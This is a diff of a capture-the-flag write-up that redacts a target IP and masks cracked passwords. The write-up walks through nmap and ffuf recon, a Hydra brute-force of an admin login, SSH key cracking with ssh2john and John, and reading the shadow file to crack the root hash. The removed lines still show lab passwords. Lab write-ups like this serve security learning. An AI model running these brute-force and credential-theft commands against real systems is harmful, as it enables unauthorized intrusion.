@@ -10,9 +10,9 @@ nmap -sV -A -p- [ip]
 </br>
 
 ```bash
-nmap -sV -A  10.128.184.18
+nmap -sV -A  [ip]
 Starting Nmap 7.95 ( https://nmap.org ) at 2026-08-14 12:57 WAT
-Nmap scan report for 10.128.184.18 (10.128.184.18)
+Nmap scan report for [ip] ([ip])
 Host is up (0.15s latency).
 Not shown: 998 closed tcp ports (conn-refused)
 PORT   STATE SERVICE VERSION
@@ -35,19 +35,19 @@ You already know the drill.
 We open our browser and explore the site. We land directly on the Apache homepage. So we'll look for the cached directories:
 
 ```bash
-ffuf -u "http://10.128.184.18/FUZZ" -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -H "User-Agent: Firefox"
+ffuf -u "http://[ip]/FUZZ" -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -H "User-Agent: Firefox"
 ```
 We quickly come across something eye-catching, an admin page. We try to brute-force the page with the Hydra tool: </br>
 
 ```bash
-hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.128.184.18 http-post-form "/admin:user=^USER^&pass=^PASS^:F=Username or password invalid" -f -V
+hydra -l admin -P /usr/share/wordlists/rockyou.txt [ip] http-post-form "/admin:user=^USER^&pass=^PASS^:F=Username or password invalid" -f -V
 ```
 
-```[80][http-post-form] host: 10.128.184.18   login: admin   password: xavier```
+```[80][http-post-form] host: [ip]   login: admin   password: x****r```
 
 And boom, with the credentials we connect to the site where we find an RSA key. We download this and use a tool called ```ssh2john``` to convert it to a format that John can crack. This gives us the passphrase. </br>
 
-```passphrase: rockinroll```
+```passphrase: ro******ll```
 
 Let's conquer the kingdom:
 ```bash
@@ -69,4 +69,4 @@ But the instructions also ask us to retrieve the root password.
 So we use `cat /ect/shadow` to retrieve the root password hash, which we'll then crack with `john`.
 
 There you go, easy!
-```root:football``
+```root:f******l``
